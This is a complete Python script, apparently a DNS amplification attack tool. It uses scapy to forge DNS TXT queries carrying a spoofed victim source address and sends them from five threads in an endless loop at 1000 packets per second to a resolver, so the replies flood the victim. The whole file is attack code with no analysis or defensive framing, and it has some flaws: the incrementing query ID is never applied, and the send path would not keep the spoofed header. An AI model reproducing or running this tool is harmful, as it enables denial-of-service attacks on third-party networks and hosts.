from scapy.all import *

import sys

import socket

import time

import threading

class AttackFlow (threading.Thread):

	"""
		init attack flow
		@param {List} dns_servers_ip
		@param {String} victime_ip
		@param {Integer} packet_per_second default 100
	"""
	def __init__ (self, server_ip, victime_ip, packet_per_second=100) :

		threading.Thread.__init__(self)

		#dns server ip
		self.server_ip = server_ip

		#victime server ip
		self.victime_ip = victime_ip

		#udp socket
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

		#dns query id to increment each time
		self.dns_query_id = 0

		#attack rate in packet per second
		self.packet_per_second = packet_per_second

		#time between two packets
		self.attack_rate = 1 / self.packet_per_second

	"""
		run the thread
		@return {Void}
	"""
	def run (self) :

		self.start_attack()

	"""
		start the attack
		@return {Void}
	"""
	def start_attack (self) :

		print(f'{self.name} has started')

		packet = IP(dst=self.server_ip, src=self.victime_ip) / UDP(dport=53, sport=5530) / DNS(id=self.dns_query_id, qd=DNSQR(qname='google.com', qtype='TXT'))

		while True :

			self.sock.sendto(bytes(packet), (self.server_ip, 53))

			time.sleep(self.attack_rate)

			self.dns_query_id += 1

"""
	start muti threaded attack
	@return {Void}
"""
def start_attack () :

	victime_ip = sys.argv[1]

	servers = ['10.0.0.1', '10.0.0.1', '10.0.0.1', '10.0.0.1', '10.0.0.1']

	threads = []

	for server in servers :

		thread = AttackFlow(server, victime_ip, 1000)

		threads.append(thread)

	for thread in threads :

		thread.start()

if __name__ == '__main__' :

	start_attack()